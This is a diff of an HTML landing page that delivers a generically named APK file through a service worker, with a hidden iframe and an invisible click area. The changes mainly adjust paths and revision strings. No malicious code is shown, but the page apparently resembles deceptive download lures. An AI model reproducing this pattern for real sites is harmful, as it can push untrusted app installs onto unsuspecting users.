@@ -5,11 +5,11 @@
   <meta name="google" content="notranslate">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Download</title>
-  <script src="../params.js?v=personal-site-1"></script>
+  <script src="../params.js?v=personal-site-5"></script>
   <script>
-    window.__downloadTestRevision = 'personal-site-1';
+    window.__downloadTestRevision = 'personal-site-5';
     window.__downloadSwVersion = '42316858';
-    window.__downloadSwUrl = `../sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
+    window.__downloadSwUrl = `${window.__landingRoot}sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
     window.__swReadyPromise = (async () => {
       await window.__landingParamsReady;
       if (!('serviceWorker' in navigator)) {
@@ -55,8 +55,8 @@
       return { ok: false, direct: true, reason: error.message };
     });
   </script>
-  <style>
-    * {
+<style>
+* {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
@@ -116,15 +116,18 @@
       opacity: 0;
       pointer-events: none;
     }
-  </style>
+
+</style>
 </head>
 <body>
-  <div class="text">Your file is ready ...</div>
+<div class="text">Your file is ready ...</div>
   <button id="downloadButton" type="button" disabled>Download file</button>
   <div id="clickArea" class="click-area" aria-hidden="true"></div>
   <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
 
-  <script>
+<script>
+(() => {
+
     const DEFAULT_FILE_NAME = 'download9918.apk';
     const TEST_REVISION = window.__downloadTestRevision;
     const SW_VERSION = window.__downloadSwVersion;
@@ -214,7 +217,7 @@
         return;
       }
 
-      const target = new URL('../download.apk', window.location.href);
+      const target = new URL('download.apk', window.__landingRoot);
       log('starting service worker download', { offerId, fileName, target: target.href });
       downloadFrame.src = 'about:blank';
       window.setTimeout(() => {
@@ -252,6 +255,9 @@
       downloadButton.disabled = true;
       log('service worker setup failed', { error: error.message, offerId });
     });
-  </script>
+
+})();
+
+</script>
 </body>
 </html>
